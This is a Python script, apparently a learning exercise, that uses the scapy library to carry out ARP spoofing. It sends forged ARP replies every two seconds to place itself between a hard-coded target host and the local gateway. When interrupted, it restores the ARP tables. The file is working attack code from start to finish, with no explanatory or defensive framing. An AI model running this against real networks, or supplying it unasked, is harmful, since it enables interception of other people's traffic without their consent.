#!/usr/bin/python3

from itertools import count
from tabnanny import verbose
import scapy.all as scapy
import time

def get_mac(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    answered_list = scapy.srp(broadcast/arp_request, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    
def restore(target_ip, real_ip):
    target_mac = get_mac(target_ip)
    real_mac = get_mac(real_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = real_ip, hwsrc = real_mac)
    scapy.send(packet, verbose = False)
    
target_ip = "192.168.1.173"
gateway_ip = "192.168.1.254"
    
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C... Resetting ARP tables... Please Wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)